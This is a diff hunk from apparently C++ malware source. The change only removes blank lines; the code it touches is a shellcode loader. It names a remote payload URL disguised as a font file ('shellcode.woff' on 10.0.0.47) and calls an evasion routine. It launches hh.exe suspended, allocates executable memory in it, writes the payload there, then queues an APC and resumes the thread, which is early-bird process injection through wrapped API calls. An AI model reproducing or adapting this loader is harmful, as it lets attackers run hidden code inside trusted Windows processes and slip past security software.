@@ -148,32 +148,17 @@ int main() {
     evade();
 	std::vector<BYTE> payload;
 	LPCWSTR url = L"http://10.0.0.47/shellcode.woff";
-
 	STARTUPINFOA si = { 0 };
 	PROCESS_INFORMATION pi = { 0 };
-
-
     pwCreateProcess("C:\\Windows\\hh.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
-	
-
 	HANDLE victimProcess = pi.hProcess;
 	HANDLE threadHandle = pi.hThread;
-
-
     LPVOID shellAddress = pwVirtualAllocEx(victimProcess, NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
     PVOID pBaseAddress = nullptr;
     SIZE_T* bytesWritten = 0;
-
-
     pwProcmem(victimProcess, shellAddress, payload.data(), payload.size(), bytesWritten);
-
     pwVirtualProtect(shellAddress, payload.size(), PAGE_EXECUTE_READ, NULL);
-
     PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
-
-
     pwQueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
-    
     ResumeThread(threadHandle);
 }
